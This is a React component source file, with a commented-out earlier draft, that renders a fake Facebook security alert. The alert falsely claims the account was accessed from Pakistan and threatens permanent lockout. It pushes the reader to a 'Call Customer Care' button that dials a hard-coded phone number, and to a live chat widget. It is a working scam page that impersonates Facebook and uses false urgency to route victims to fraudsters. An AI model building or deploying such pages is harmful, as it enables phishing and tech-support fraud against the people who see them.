// 'use client'
// import { Shield, LogIn, Settings, X } from "lucide-react"
// import { Button } from "@/components/ui/button"
// import { Card, CardContent, CardFooter, CardHeader } from "@/components/ui/card"
// import { Separator } from "@/components/ui/separator"

// export function FacebookNotification() {
//   const handleRegisterClick = () => {
//     window.location.href = 'tel:1-800-123-4567';
//   };
  
//   const handleInfoClick = () => {
//     if (window.Tawk_API && typeof window.Tawk_API.maximize === 'function') {
//       window.Tawk_API.maximize(); // Open the chat widget
//     } else {
//       alert("Chat is still loading. Please wait a moment...");
//     }
//   };
//   return (
//     <Card className="w-full max-w-md border-t-4 border-t-[#1877F2] shadow-lg">
//       <CardHeader className="flex flex-row items-start justify-between space-y-0 pb-2">
//         <div className="flex items-center gap-2">
//           <div className="flex items-center justify-center rounded-full">
//             <img src="/facebook.svg" alt="" className="h-24 w-24 text-white" />
//           </div>
//           <div>
//             {/* <h2 className="text-lg font-bold">Security Alert from Facebook</h2> */}
//             {/* <p className="text-xs text-muted-foreground">Facebook Account Notification</p> */}
//           </div>
//         </div>
//         <Button variant="ghost" size="icon" className="h-8 w-8">
//           <X className="h-4 w-4" />
//           <span className="sr-only">Close</span>
//         </Button>
//       </CardHeader>
//       <CardContent className="pt-4">
//         <div className="space-y-4">
//           <div className="flex items-start gap-3 rounded-lg bg-blue-50 p-3 dark:bg-blue-950">
//             <LogIn className="mt-0.5 h-5 w-5 text-[#1877F2]" />
//             <div>
//               <p className="font-bold text-[#1877F2]">New Login Detected</p>
//               <p className="text-lg font-bold text-muted-foreground">
//                 We've detected a suspicious login attempt to your Facebook account from an unrecognized device. Your account may currently be active on another device without your permission
//               </p>
//             </div>
//           </div>

//           <div className="space-y-2">
//             <p className="md:text-2xl">If you did not authorize this login, It is strongly recommended to take immediate action. Please call the number below right away to log out from the unknown device and secure your account:</p>
//           </div>
//         </div>
//       </CardContent>
//       <div className="flex justify-between md:justify-center gap-2 md:gap-8 md:mt-8">
//             <button 
//               onClick={handleRegisterClick}
//               className="flex-1 md:flex-none md:px-16 bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 md:py-6 px-3 rounded-full text-sm md:text-2xl transition transform hover:-translate-y-1 hover:shadow-lg  cursor-pointer"
//             >
//               Call now
//             </button>
//             <button 
//               onClick={handleInfoClick}
//               className="flex-1 md:flex-none md:px-16 border-2 border-blue-600 text-blue-600 hover:bg-blue-50 font-large py-2 md:py-6 px-3 rounded-full text-sm md:text-2xl transition cursor-pointer"
//             >
//               Chat With Us
//             </button>
//           </div>
//       <Separator />
//         {/* <Button className="w-full bg-[#1877F2] hover:bg-[#0e6edf]">Review Recent Logins</Button> */}
        
//     </Card>
//   )
// }




'use client'
import { Shield, LogIn, Settings, X } from "lucide-react";
import { useEffect, useState } from "react";

export function FacebookNotification() {
  const [isTawkLoaded, setIsTawkLoaded] = useState(false);

  useEffect(() => {
    if (typeof window !== "undefined" && window.Tawk_API?.maximize) {
      setIsTawkLoaded(true);
    }
  }, []);

  const handleRegisterClick = () => {
    window.location.href = 'tel:18338692112';
  };

  const handleInfoClick = () => {
    if (isTawkLoaded) {
      window.Tawk_API.maximize();
    } else {
      alert("Chat is still loading. Please wait a moment...");
    }
  };

  return (
    <div className="fixed w-full flex items-center justify-center p-4 bg-gray-50">
      <div className="w-full max-w-lg border-t-4 border-t-[#1877F2] shadow-lg bg-white rounded-lg">
        <div className="flex flex-row items-start justify-between p-4 ">
        <div className="w-full flex justify-center items-center">
  <div className="rounded-full">
    <img 
      src="/facebook.svg" 
      alt="Facebook" 
      className="h-24 w-24 sm:h-32 sm:w-20 md:h-24 md:w-24 object-contain" 
    />
  </div>
</div>
          <button className="p-2 hover:bg-gray-100 rounded-full transition-colors">
            <X className="h-4 w-4 sm:h-5 sm:w-5" />
            <span className="sr-only">Close</span>
          </button>
        </div>
        <div className="p-4 sm:p-6">
          <div className="space-y-4">
            <div className="flex items-start gap-3 rounded-lg bg-blue-50 p-3 sm:p-4">
              <LogIn className="mt-0.5 h-5 w-5 sm:h-6 sm:w-6 text-[#1877F2]" />
              <div>
                <p className="font-bold text-[#1877F2] text-sm sm:text-base">New Login Detected</p>
                <p className="text-sm sm:text-base md:text-lg text-gray-600">
                  Your Facebook account has been accessed from Pakistan. To avoid permanent lockout, call the number below now to logout and secure your account.
                </p>
              </div>
            </div>
            <div className="space-y-2">
              <p className="text-sm sm:text-base md:text-lg text-gray-700">
                If you did not authorize this login, it is strongly recommended to take immediate action. Please call the number below right away to log out from the unknown device and secure your account:
              </p>
            </div>
          </div>
          <div className="flex flex-col sm:flex-row justify-center gap-3 sm:gap-4 mt-6 sm:mt-8">
            <button 
              onClick={handleRegisterClick}
              className="w-full sm:w-auto px-6 sm:px-8 bg-blue-600 hover:bg-blue-700 text-white 
                       font-medium py-3 sm:py-4 rounded-full text-sm sm:text-base md:text-lg 
                       transition transform hover:-translate-y-1 hover:shadow-lg cursor-pointer"
            >
              Call Customer Care
            </button>
            <button 
              onClick={handleInfoClick}
              className="w-full sm:w-auto px-6 sm:px-8 border-2 border-blue-600 text-blue-600 
                       hover:bg-blue-50 font-medium py-3 sm:py-4 rounded-full text-sm sm:text-base 
                       md:text-lg transition cursor-pointer"
            >
              Chat With Us
            </button>
          </div>
        </div>
        <div className="h-px bg-gray-200 my-4" />
      </div>
    </div>
  );
}
export default FacebookNotification;